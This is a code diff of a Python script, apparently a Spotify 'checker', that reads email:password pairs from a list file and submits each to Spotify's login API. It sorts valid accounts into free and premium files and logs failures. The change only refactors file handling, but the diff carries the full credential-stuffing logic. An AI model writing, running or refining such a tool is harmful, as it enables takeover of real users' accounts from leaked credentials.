@@ -16,14 +16,12 @@ else :
     exit()
 
 
-f = open("liste.txt", "r")
-listeler = f.read()
-if(listeler == '') :
-    print('HATA: liste.txt dosyasını açın ve girişleri bu modele yerleştirin jucelino@gmail.com: 1234')
-    exit()
-listeler = listeler.split('\n')
-f.close()
-
+with open("liste.txt", "r") as f:
+    listeler = f.read()
+    if(listeler == '') :
+        print('HATA: liste.txt dosyasını açın ve girişleri bu modele yerleştirin jucelino@gmail.com: 1234')
+        exit()
+    listeler = listeler.split('\n')
 for x in range(len(listeler)):
 
     liste = listeler[x]
@@ -41,25 +39,21 @@ for x in range(len(listeler)):
 
     session = requests.Session()
     req = session.post(url = 'https://accounts.spotify.com/api/login', data = params, cookies = cookies, headers = headers)
-    if('displayName' in req.text) :
+    if ('displayName' in req.text):
         listeWorking = True
         req = session.get('https://www.spotify.com/uk/account/subscription/')
-        if('Spotify Free' in req.text) :
-            free = open("free.txt", "a+")
-            print('[FREE] '+username+':'+password)
-            free.write(username+':'+password+'\n')
-            free.close()
-        else :
-            premium = open("premium.txt", "a+")
-            print('[PREMIUM] '+username+':'+password)
-            premium.write(username+':'+password+'\n')
-            premium.close()
-
-    else :
-        notworking = open("reddedilen.txt", "a+")
-        listeWorking = False
-        print('[DIE] '+username+':'+password)
-        notworking.write(username+':'+password+'\n')
-        notworking.close()
+        if ('Spotify Free' in req.text):
+            with open("free.txt", "a+") as free:
+                print('[FREE] '+username+':'+password)
+                free.write(username+':'+password+'\n')
+        else:
+            with open("premium.txt", "a+") as premium:
+                print('[PREMIUM] '+username+':'+password)
+                premium.write(username+':'+password+'\n')
+    else:
+        with open("reddedilen.txt", "a+") as notworking:
+            listeWorking = False
+            print('[DIE] '+username+':'+password)
+            notworking.write(username+':'+password+'\n')
 
 
